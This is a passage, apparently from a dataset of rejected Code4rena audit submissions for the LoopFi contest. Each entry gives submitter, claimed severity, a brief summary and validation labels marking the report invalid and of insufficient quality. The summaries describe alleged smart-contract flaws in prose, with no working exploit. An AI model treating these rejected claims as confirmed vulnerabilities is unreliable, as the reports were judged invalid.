In the `_deposit()` function, the receiver's balance should increase by the number of shares minted. However, when the `_deposit()` function is called with shares set to 0, no shares are minted to the receiver, violating **"Receiver's balance should increase correctly"**. [PoolV3.sol#L384-L395](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L380-L395) Impact If the `_deposit()` function is called with shares set to 0, the user's balance will not reflect the expected increase based on the assets deposited. This discrepancy can cause confusion and loss of funds for users who expect to receive shares proportional to their deposited ass...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_228_group

# Incorrect Liquidity Update in _withdraw() Can Lead to Liquidity Underflow

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-240
- **Submitter:** emerald7017
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/240
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-240.md

## Brief Summary

In the PoolV3, the `_withdraw()` function incorrectly updates the available liquidity, potentially leading to a liquidity underflow. This issue arises from the `_updateBaseInterest()` function call within `_withdraw()`, where the `availableLiquidityDelta` parameter is passed as the negative of `assetsSent`. The problemat is located in [PoolV3.sol#L412-L416](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L412-L416) Although the intention is to subtract `assetsSent` from the available liquidity, the resulting `availableLiquidity` after the update becomes a large number, indicating an underflow or incorrect calculation within `_updateB...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Incorrect Debt Reduction in `repayCreditAccount()` Due to Precision Loss

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-256
- **Submitter:** emerald7017
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/256
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-256.md

## Brief Summary

`repayCreditAccount()` logic can lead to incorrect debt reduction when the `repaidAmount` parameter exceeds `type(uint128).max`. This problem arises from the conversion of `repaidAmount` to `uint128` before updating the `_totalDebt.borrowed` and `cmDebt.borrowed` variables. The root cause of the issue is the conversion of `repaidAmount` from `uint256` to `uint128` using the `toUint128()` on [line 540](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L540). This conversion can lead to a loss of precision if `repaidAmount` exceeds `type(uint128).max`. The affected [lines, 572 - 573](https://github.com/code-423n4/2024-07-loopfi/blob/5787...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_13_group

# DoS if user Redeem Exact Amount of the asset in stakingLPEth

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-579
- **Submitter:** golu
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/579
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-579.md

## Brief Summary

DoS if user Redeem Exact Amount of the asset in stakingLPEth

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# `positions` variable is not updated

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-608
- **Submitter:** grearlake
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/608
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-608.md

## Brief Summary

In multiple functions in `CDPVault` contract: `modifyCollateralAndDebt()`, `liquidatePosition()`, `liquidatePositionBadDebt()`, all variable in `positions` is updated in temporatory variable: Position memory position = positions[owner]; <-- DebtData memory debtData = _calcDebt(position); . . . . . . . position = _modifyPosition(owner, position, newDebt, newCumulativeIndex, deltaCollateral, totalDebt); These temporatory variable is not writen back to its origin, which mean the value of them is not kept over time. Impact Variable value is not updated.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Unable to withdraw in `PositionAction` contract

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-730
- **Submitter:** grearlake
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/730
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-730.md

## Brief Summary

`creditFlashLoan()` function in `Flashlender` contract is used to flash lending in the pool function creditFlashLoan( ICreditFlashBorrower receiver, uint256 amount, bytes calldata data ) external override nonReentrant returns (bool) { uint256 fee = wmul(amount, protocolFee); uint256 total = amount + fee; pool.lendCreditAccount(amount, address(receiver)); emit CreditFlashLoan(address(receiver), amount, fee); if (receiver.onCreditFlashLoan(msg.sender, amount, fee, data) != CALLBACK_SUCCESS_CREDIT) revert Flash__creditFlashLoan_callbackFailed(); // reverts if not enough Stablecoin have been send back underlyingToken.transferFrom(address(receiver), address(pool), total); pool.repayCreditAccount...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_44_group

# Over-Leverage Risk in depositWithReferral Function Due to Missing Asset Limit Checks

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-296
- **Submitter:** hassan-truscova
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/296
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-296.md

## Brief Summary

The vulnerability allows users to deposit potentially excessive amounts of assets, leading to over-leverage. This exposes users to higher risks of market volatility and credit losses beyond the system's designed risk tolerance. Consequently, such over-leverage could destabilize the financial health of LoopFi, increasing the risk of defaults and adversely affecting all users and stakeholders.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_91_group

# Denial of Service Through Gas Exhaustion in withdraw Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-355
- **Submitter:** hassan-truscova
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/355
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-355.md

## Brief Summary

The `withdraw` function is vulnerable to gas exhaustion attacks, which can significantly impact the contract’s reliability and performance. An attacker can exploit this vulnerability to cause the function to consume excessive gas, leading to out-of-gas errors.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_21_group

# Pausing `ChefIncentivesController` contract by the owner can unexpectedly block the users from claiming the reward

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-362
- **Submitter:** hassan-truscova
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/362
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-362.md

## Brief Summary

The vulnerability in `ChefIncentivesController` contract arises from the ability of the owner to unilaterally pause the contract. This can prevent users from performing critical operations such as claiming their rewards by calling `claim` function or accessing their funds.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Contract contains payable functions but no withdraw/sweep function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-299
- **Submitter:** jauvany
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/299
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-299.md

## Brief Summary

In smart contract development, particularly for Ethereum, having payable functions without a corresponding withdraw or sweep function can lead to potential issues. Payable functions allow the contract to receive Ether, but without a mechanism to withdraw these funds, the Ether can become locked within the contract indefinitely. This situation might be intentional in some cases (like a burn function), but generally, it’s a design oversight. A withdraw or sweep function is necessary to transfer Ether out of the contract to a specific address, typically the owner's or a designated recipient. Without this, the contract lacks flexibility in managing its funds, potentially leading to lost or inac...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_196_group

# Attacker can potentially manipulate FlashLender into a profitable attack

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-145
- **Submitter:** jigster
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/145
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-145.md

## Brief Summary

Flashlender can be called from an arbitrary address and execute a flashloan. During the course of this flashloan, it is possible for a malicious vault whose modifyCollateralAndDebt method can implement arbitrary logic. While not demonstrated here, so long as this arbitrary logic can result in a profitable attack, ie repay the flashloan, the call will succeed. This

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# updateRates at the PoolQuotaKeeperV3 is vulnerable to front-runs that harm the quota revenue amounts

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-612
- **Submitter:** joaovwfreire
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/612
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-612.md

## Brief Summary

The PoolQuotaKeeperV3 updateRates function updates the quotaRevenue by multiplying the amount of amount borrowed by a credit manager and the current rate, then it call setQuotaRevenue at the Pool contract: Notice this quotaRevenue relies on the amount instantly borrowed by the creditManager: This borrowed amount can be increased by lending to a credit account and decreased by repaying a loan. This creates the opportunity for malicious users to repay their loans right before a Gauge calls updateRates in order to decreased the total amount of quotaRevenue. In the context of Mainnet, this is a realistic risk through front-runs. Impact Malicious parties can opt to repay their borrows right befo...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_108_group

# Reentrancy Risk in PositionActionPendle Contract Due to Delegated Calls

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-246
- **Submitter:** johnthebaptist
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/246
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-246.md

## Brief Summary

The `PositionActionPendle` contract contains functions that delegate calls to external contracts (`poolAction.join` and `poolAction.exit`). These delegated calls could introduce reentrancy risks if the external functions are not properly secured. Reentrancy attacks can allow an attacker to repeatedly call a function before the previous execution is complete, potentially manipulating state variables or draining funds from the contract. Specific Impact: 1. **Manipulation of State Variables**: An attacker could re-enter the contract and manipulate state variables, leading to incorrect contract behavior. 2. **Draining Funds**: An attacker could repeatedly withdraw funds, draining the contract's...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_102_group

# Possible precision loss in `BAL/USD` price from `AuraVault::_chainlinkSpot` calllculation of `price` could inflate rewards calculations

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-169
- **Submitter:** josephxander
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/169
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-169.md

## Brief Summary

The `AuraVault::_chainlinkSpot` is used to return the `BAL/USD` price in 8 decimals s defined by `AuraVault::BAL_CHAINLINK_DECIMALS` Due to mathematical operations, the utilized `price` is inflated to `e18`.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# There are no checks to ensure core parameters are set before core functions can be callable in `CDPVault`

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-219
- **Submitter:** josephxander
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/219
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-219.md

## Brief Summary

`CDPVault` has 2 `configuration` functions that sets core parameters of the contract; `CDPVault::setParameter(bytes, uint)` and `CDPVault::setParameter(bytes, address)`. If upon deployment, an actor can immediately perform certain actions that defy the intended baseline parameter bounds for such. For instance, one could deposit below the `debtFloor`, or deposit and self liquidate without the cost of `liquidationPenalty`. Without a flag or check or modifier of somesort that verifies that these mandatory parameters are set, some of these functions that depend on protocol sanitary parametrs can be executed at the protrocol's peril.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Unsafe Casting

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-270
- **Submitter:** kerdakov
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/270
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-270.md

## Brief Summary

Downcasting int/uints in Solidity can be unsafe due to the potential for data loss and unintended behavior.When downcasting a larger integer type to a smaller one (e.g., uint256 to uint128), the value may exceed the range of the target type,leading to truncation and loss of significant digits Impact Truncation and loss of significant digits

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_126_group

# Incorrect Assembly Shift Parameter Order

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-271
- **Submitter:** kerdakov
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/271
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-271.md

## Brief Summary

The incorrect order of parameters in the `shl` (shift left) assembly operation can lead to unintended behavior in the smart contract. In Solidity's inline assembly, the `shl` function should be used as `shl(shift, value)`, where shift is the number of bits to shift left and value is the value to be shifted. If the parameters are reversed, as in `shl(value, shift)`, the result will be different from the intended behavior and can lead to logical errors or incorrect computations.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Return value of the function call is not checked

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-273
- **Submitter:** kerdakov
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/273
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-273.md

## Brief Summary

Ignoring the return values of function calls can lead to unintended behavior or missed errors in smart contracts. Functions that return values, especially those involving external contract interactions, may indicate the success or failure of an operation. Failing to check these return values can mask issues such as transaction failures, incorrect operations, or unexpected results, potentially leading to financial losses or compromised contract functionality.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Storage Array Edited with Memory

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-274
- **Submitter:** kerdakov
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/274
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-274.md

## Brief Summary

Storage reference is passed to a function with a memory parameter. This will not update the storage variable as expected.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Relying on Highly Risky Comparison Between `bytes32` and String Literals

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-326
- **Submitter:** kerdakov
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/326
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-326.md

## Brief Summary

Relying on implicit conversions can be risky because: - Implicit conversions might not handle all possible cases correctly, especially with different string lengths or character encodings. - Future versions of Solidity might handle these conversions differently, leading to unexpected behavior(especially in this case with the floating pragma, this is a huge problem which may arrise in future). - Code relying on implicit conversions can be harder to understand and maintain. Impact The current implementation of the `setParameter` functions in `CDPVault.sol` and `AuraVault.sol` involves comparing `bytes32` values with string literals directly. While the tests may pass in the current implementat...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Incorrect debt data calculation due to Invalid Validation of the address parameter of liquidatePosition() and liquidatePositionBadDebt().

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-480
- **Submitter:** la-arana-inteligente
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/480
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-480.md

## Brief Summary

The check for 'if (owner == address(0) || repayAmount == 0) revert CDPVault__liquidatePosition_invalidParameters();' on lines 511 and 581 could be bypassed by passing a non-zero 'owner' address that doesn't correspond to any existing position which results in incorrect logic execution further down the line.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Zero-cost minting (due to inheritance from the implemented ERC4626 contract) could potentially give an attacker a disproportionate share of StakingLPEth.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-552
- **Submitter:** la-arana-inteligente
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/552
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-552.md

## Brief Summary

An attacker could mint a large number of shares at zero asset deposit, effectively gaining a disproportionate share of the pool. Details If the `mint` function of ERC4626.sol is accessible to `StakingLPEth.sol` (due to inheritance which is the case here) and the share price is zero (or very very low) due to contract initialization (or a specific edge case), an attacker could mint a large number of shares at zero or neaar-zero asset deposit, effectively gaining a disproportionate(unfair) share of the pool. Note: While `_checkMinShares` is a useful function for ensuring that the total supply of shares doesn’t fall below a small threshold, it does not address the root cause of the exploit desc...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Unspecified permission type could allow permitted address for

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-55
- **Submitter:** lanrebayode77
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/55
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-55.md

## Brief Summary

In the , different check was carried out against the caller who is modifying a user position. The check aims to verify the caller is either the owner of the poison or permitted by the owner to modify the position in certain ways. The problem with the check is that the does not check for specific permission. As a matter of fact, there is no method in Permission.sol that allows a user to give specified permission. This it is possible for the caller to perform a different modification contrary to what the owner permitted.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_61_group

# [M-01] Malicious consumption of fee

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-138
- **Submitter:** lanyi2023
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/138
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-138.md

## Brief Summary

Potential malicious depletion of receiver's token balance through excessive fees.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Deposits and withdrawals are rounded down in the same direction which is incorrect.

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-161
- **Submitter:** lightoasis
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/161
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-161.md

## Brief Summary

Deposits and withdrawals are rounded down in the same direction, which is incorrect as they are two different operations. Vulnerability Details There are rounding errors in the cdp vault. Deposits and withdrawals are rounded down in the same direction, which is incorrect as they are two different operations. Deposits adds collateral to the vault, withdrawals removes collateral from the vault. Hence, they cannot be rounded in the same direction. Deposits should be rounded down and withdrawals should be rounded up.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Slippage check enforces max slippage on all users.

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-52
- **Submitter:** lightoasis
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/52
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-52.md

## Brief Summary

Incorrect slippage checks enforces max slippage on all users. Bug Description The slippage checks in `setAutocompound` and `setUserSlippage` enforces all users to use the max slippage of 10% which shouldn't be. Users have different slippage tolerance. Some users would want a lower slippage like 2 - 5% as not all users would want to use the max slippage of 10% which is too extreme.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_117_group

# Corruptible Upgradability Pattern

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-331
- **Submitter:** mrMorningstar
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/331
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-331.md

## Brief Summary

Storage of [BalancerOracle](https://github.com/code-423n4/2024-07-loopfi/blame/57871f64bdea450c1f04c9a53dc1a78223719164/src/oracle/BalancerOracle.sol#L53) contract might be corruptible during upgrade.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# `_massUpdatePools()` is susceptible to DoS with block gas limit

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-640
- **Submitter:** nadin
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/640
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-640.md

## Brief Summary

`_massUpdatePools()` is used to update the reward variables for all pools based on `poolLength()`. Hence, it is an unbounded loop, depending on the length of reward pools. If `registeredTokens.length` is big enough, block gas limit may be hit.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_89_group

# dubious typecast

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-33
- **Submitter:** nnamdi0482
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/33
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-33.md

## Brief Summary

Detailed description of the impact of this finding. the typecast id dubious and may not be understood

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_68_group

# Potential for Optimization in Supply Rate Calculation to Ensure Precise Interest Payments

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-514
- **Submitter:** obingo76
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/514
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-514.md

## Brief Summary

Within PoolV3.sol, in the ``supplyRate()`` function, if the ``_totalDebt.borrowed`` amount approaches the ``totalAssets`` value, the interest rate calculation could result in truncation due to division. The ``baseInterestRate`` is in RAY form ``(scaled by 1e27)``, and when it's multiplied by ``_totalDebt.borrowed`` and then divided by ``totalAssets``, it could lead to rounding down to the nearest integer value.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_105_group

# StakingLPEth can be arbitraged by any users

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-556
- **Submitter:** pks_
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/556
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-556.md

## Brief Summary

From the [loopfi doc](https://docs.loopfi.xyz/the-protocol/lending-passive-eth-yield) about lpETH usage: we can know, any lpETH stakers can get slpETH, and the slpETH value will increase over time. And the slpETH increase as `the protocol yield is transferred into the Staking smart contract`, we can also find the related [test cases](https://github.com/code-423n4/2024-07-loopfi/blob/4f508781a49ffa53511e7e5ed6cda0ff0eb5bdc5/src/test/unit/StakingLP.t.sol#L50-L57) to understand it. So any users can monitor the mempool, staking lpETH before the protocol yield is transferred to `StakingLPEth` contract to receive slpETH, then wait for the protocol yield is transferred to `StakingLPEth` contract,...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_78_group

# Wrong insolvent calculation can cause users borrow more or avoid be liquidated

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-566
- **Submitter:** pks_
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/566
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-566.md

## Brief Summary

`CDPVault#_isCollateralized` is called by `CDPVault#liquidatePosition` and `CDPVault#modifyCollateralAndDebt` to check if the position is insolvent or not: However, the insolvent calculation is incorrect because the collateral value calculation is based on `position.collateral * spotPrice_` but the debt value is based on `debtData.debt + debtData.accruedInterest`, the token units is not the same, as collateral value is about `X $usd`, but the debt is the debt token units like `WETH` or something else. For example, if collateral token is 1 WETH or ETH derivatives and the price is about 3000 $usd, but the debt token is SOL and the price is 150 $usd. If he want to borrow 1000 SOL, then collate...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Two separate functions responsible for converting to shares will cause weird errors

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-410
- **Submitter:** samuraii77
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/410
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-410.md

## Brief Summary

Two separate functions responsible for converting to shares will cause weird errors

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# base interest rate could be calculated incorrectly if a user withdraws more than available

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-529
- **Submitter:** silver_eth
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/529
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-529.md

## Brief Summary

base interest rate could be calculated incorrectly if a user withdraws more than available

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Debt repayment logic yields entirely different results if the user chooses to repay <= quotaInterest instead of the whole accrued interest at once

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-515
- **Submitter:** wallstreetvilkas
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/515
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-515.md

## Brief Summary

In order for the user to repay it's debt, it has to call modifyCollateralAndDebt() (https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L367C14-L367C37). When repaying debt, the following else if is executed (https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L402-L432), and, if the amount that the user is repaying isn't the total debt of the position, this else is executed: (https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L418-L426). The problem arises in calcDecrease() function (https://github.com/code-423n4/2024-07-lo...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Deposit, mint and claim can be DOSed due to lack of safeApprove to 0

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-662
- **Submitter:** y0ng0p3
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/662
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-662.md

## Brief Summary

